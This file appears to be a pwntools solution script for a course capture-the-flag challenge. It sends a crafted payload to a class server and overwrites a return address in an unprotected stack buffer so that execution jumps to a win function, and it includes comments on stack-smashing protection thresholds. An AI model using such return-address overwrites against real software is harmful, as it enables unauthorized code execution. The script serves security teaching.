from pwn import *

gdbscript = '''
            break *main
            shell tmux swap-pane -U
            shell tmux select-layout main-vertical
            continue
            '''

#bpath = './ssp'
#elf = ELF(bpath)
#context.binary = elf
context.log_level = 'debug'

win_addr = p64(0x55555555491a + 1)


def test_offset(offset):
    p = remote('cs4401shell.walls.ninja', 14157)

    #win_addr = int(p.recvline().split(b': ')[1][:-1], 16)
    #print('win addr:', hex(win_addr))

    # ssp-buffer-size param sets the minimum buffer size that will be protected by stack smashing pprotection
    # using cyclic(256) on buffer a results in a "stack smashing detected" error
    # but using the same input on buffer b doesn't give the same error, only a core dump message
    p.sendline(cyclic(8))   # ignore first fgets()
    p.sendline(b"b")        # go to b()

    # overwrite b()'s return address
    exploit_str = flat({offset: win_addr})
    p.sendline(exploit_str)

    p.interactive()


#for i in range(256, 0, -1):
#    print('\n\nNow trying offset', i)
#    test_offset(i)

test_offset(136)
